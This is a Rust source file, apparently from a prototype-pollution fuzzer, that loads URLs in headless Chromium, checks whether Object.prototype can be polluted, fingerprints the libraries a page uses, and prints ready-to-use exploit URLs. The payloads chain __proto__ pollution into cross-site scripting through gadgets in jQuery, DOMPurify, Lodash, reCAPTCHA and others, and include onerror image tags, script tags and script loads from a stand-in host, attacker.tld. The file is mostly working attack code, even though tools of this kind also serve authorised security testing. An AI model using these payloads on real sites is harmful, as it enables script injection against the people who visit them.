use {
	chromiumoxide::Browser,
	colored::*,
	futures::{StreamExt, stream},
	std::sync::Arc,
	url::Url
};

use crate::parser;

static CHECK_SCRIPT: &str = "(window.ppfuzz || Object.prototype.ppfuzz) == 'reserved' && true || false";

pub async fn new(urls: Vec<String>, browser: Browser, opt: parser::Options) {
	let browser = Arc::new(browser);
	let mut stream = stream::iter(urls.into_iter()
		.map(|url| (url, Arc::clone(&browser)))
		.map(|(url, browser)| async move {
			let is_err: bool = false;
			let mut gadgets: Vec<String> = vec![];
			let mut detail: String = String::new();
			let page = match browser.new_page(&url).await {
				Ok(res) => res,
				Err(err) => {
					detail = err.to_string();
					return Ok((url, false, !is_err, detail, gadgets))
				}
			};
			let vuln: bool = match page.evaluate(CHECK_SCRIPT).await {
				Ok(res) => res.into_value().unwrap(),
				Err(_) => false
			};

			if vuln {
				gadgets = match page
					.evaluate(include_str!("fingerprint.js"))
					.await {
						Ok(res) => {
							page.close().await.unwrap();
							res.into_value().unwrap()
						},
						Err(_) => gadgets
					};
			}

			Ok::<_, Box<dyn std::error::Error>>
			((url, vuln, is_err, detail, gadgets))
		}
	)).buffer_unordered(opt.concurrency);

	while let Some(res) = stream.next().await {
		if let Ok((ref url, vuln, is_err, detail, gadgets)) = res {
			if vuln {
				let mut target = Url::parse(url).unwrap();

				println!("[{}] {}", "VULN".green(), url);

				target.set_query(None);
				escalate(target.to_string(), gadgets);
			} else {
				let mut msg = format!("[{}] {}", "ERRO".red(), url);
				if is_err {
					let det = format!("({})", detail);
					msg = format!("{} {}", msg, det.yellow());
				}

				eprintln!("{}", msg)
			}
		}
	}
}

fn escalate(target: String, gadgets: Vec<String>) {
	for gadget in gadgets.iter() {
		match gadget.as_str() {
			"Adobe Dynamic Tag Management" => {
				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[src]",
								"data:,alert(1)//"
							)
						]
					)
					.unwrap(), gadget
				)
			},
			"Akai Boomerang" => {
				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[BOOMR]",
								"1"
							),
							(
								"__proto__[url]",
								"//attacker.tld/js.js"
							)
						]
					)
					.unwrap(), gadget
				)
			},
			"Closure" => {
				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[* ONERROR]",
								"1"
							),
							(
								"__proto__[* SRC]",
								"1"
							)
						]
					)
					.unwrap(), gadget
				);

				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[CLOSURE_BASE_PATH]",
								"data:,alert(1)//"
							)
						]
					)
					.unwrap(), gadget
				)
			},
			"DOMPurify" => {
				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[ALLOWED_ATTR][0]",
								"onerror"
							),
							(
								"__proto__[ALLOWED_ATTR][1]",
								"src"
							)
						]
					)
					.unwrap(), gadget
				);

				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[documentMode]",
								"9"
							)
						]
					)
					.unwrap(), gadget
				)
			},
			"Embedly" => {
				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[onload]",
								"alert(1)"
							)
						]
					)
					.unwrap(), gadget
				)
			},
			"jQuery" => {
				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[context]",
								"<img/src/onerror=alert(1)>"
							),
							(
								"__proto__[jquery]",
								"x"
							)
						]
					)
					.unwrap(), gadget
				);

				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[url][]",
								"data:,alert(1)//"
							),
							(
								"__proto__[dataType]",
								"script"
							)
						]
					)
					.unwrap(), gadget
				);

				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[url]",
								"data:,alert(1)//"
							),
							(
								"__proto__[dataType]",
								"script"
							),
							(
								"__proto__[crossDomain]",
								""
							)
						]
					)
					.unwrap(), gadget
				);

				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[src][]",
								"data:,alert(1)//"
							)
						]
					)
					.unwrap(), gadget
				);

				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[url]",
								"data:,alert(1)//"
							)
						]
					)
					.unwrap(), gadget
				);

				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[div][0]",
								"1"
							),
							(
								"__proto__[div][1]",
								"<img/src/onerror=alert(1)>"
							),
							(
								"__proto__[div][2]",
								"1"
							)
						]
					)
					.unwrap(), gadget
				);

				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[preventDefault]",
								"x"
							),
							(
								"__proto__[handleObj][]",
								"x"
							),
							(
								"__proto__[delegateTarget]",
								"<img/src/onerror=alert(1)>"
							)
						]
					)
					.unwrap(), gadget
				);
			},
			"js-xss" => {
				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[whiteList][img][0]",
								"onerror"
							),
							(
								"__proto__[whiteList][img][1]",
								"src"
							)
						]
					)
					.unwrap(), gadget
				)
			},
			"Knockout.js" => {
				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[4]",
								"a':1,[alert(1)]:1,'b"
							),
							(
								"__proto__[5]",
								","
							)
						]
					)
					.unwrap(), gadget
				)
			},
			"Lodash <= 4.17.15" => {
				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[sourceURL]",
								"  alert(1)"
							)
						]
					)
					.unwrap(), gadget
				)
			},
			"Marionette.js / Backbone.js" => {
				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[tagName]",
								"img"
							),
							(
								"__proto__[src][]",
								"x:"
							),
							(
								"__proto__[onerror][]",
								"alert(1)"
							)
						]
					)
					.unwrap(), gadget
				)
			},
			"Google reCAPTCHA" => {
				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[srcdoc][]",
								"<script>alert(1)</script>"
							)
						]
					)
					.unwrap(), gadget
				)
			},
			"sanitize-html" => {
				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[*][]",
								"onload"
							)
						]
					)
					.unwrap(), gadget
				);

				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[innerText]",
								"<script>alert(1)</script>"
							)
						]
					)
					.unwrap(), gadget
				)
			},
			"Segment Analytics.js" => {
				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[script][0]",
								"1"
							),
							(
								"__proto__[script][1]",
								"<img/src/onerror=alert(1)>"
							),
							(
								"__proto__[script][2]",
								"1"
							)
						]
					)
					.unwrap(), gadget
				)
			},
			"Sprint.js" => {
				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[div][intro]",
								"<img src onerror=alert(1)>"
							)
						]
					)
					.unwrap(), gadget
				)
			},
			"Swiftype Site Search" => {
				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[xxx]",
								"alert(1)"
							)
						]
					)
					.unwrap(), gadget
				)
			},
			"Tealium Universal Tag" => {
				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[attrs][src]",
								"1"
							),
							(
								"__proto__[src]",
								"//attacker.tld/js.js"
							)
						]
					)
					.unwrap(), gadget
				)
			},
			"Twitter Universal Website Tag" => {
				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[attrs][src]",
								"1"
							),
							(
								"__proto__[hif][]",
								"javascript:alert(1)"
							)
						]
					)
					.unwrap(), gadget
				)
			},
			"Wistia Embedded Video" => {
				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[innerHTML]",
								"<img/src/onerror=alert(1)>"
							)
						]
					)
					.unwrap(), gadget
				)
			},
			"Zepto.js" => {
				show_pontential(
					Url::parse_with_params(
						&target,
						&[
							(
								"__proto__[onerror]",
								"alert(1)"
							)
						]
					)
					.unwrap(), gadget
				)
			},
			_ => ()
		}
	}
}

fn show_pontential(url: impl AsRef<str>, gadget: &str) {
	let gad = format!("({})", gadget);
	println!("[{}] {} {}", "INFO".blue(), url.as_ref(), gad.green());
}